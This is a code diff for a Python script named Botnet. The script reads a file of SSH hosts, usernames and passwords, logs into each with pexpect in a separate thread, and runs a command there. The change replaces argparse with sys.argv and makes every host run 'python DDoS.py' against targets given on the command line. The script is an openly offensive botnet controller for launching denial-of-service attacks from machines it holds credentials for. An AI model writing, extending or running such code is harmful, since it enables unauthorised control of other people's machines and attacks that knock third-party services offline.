@@ -1,6 +1,6 @@
 from pexpect import pxssh
 import threading
-import argparse
+import sys
 
 
 class Botnet:
@@ -35,13 +35,12 @@ class Botnet:
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser()
-    parser.add_argument("--b", "--botnet-list", help="Please enter the botnet list file")
-    args = parser.parse_args()
-    with open(args.b, "r") as file:
+    with open(sys.argv[1], "r") as file:
         ssh_list = file.readlines()
 
     for i in ssh_list:
         t = threading.Thread(target=Botnet, args=(i.strip("\n").split(",")[0], i.strip("\n").split(",")[1],
-                                                  i.strip("\n").split(",")[2], "python " + i.strip("\n").split(",")[3]))
+                                                  i.strip("\n").split(",")[2],
+                                                  "python DDoS.py " + sys.argv[2] + " " +
+                                                  sys.argv[3] + " " + sys.argv[4]))
         t.start()
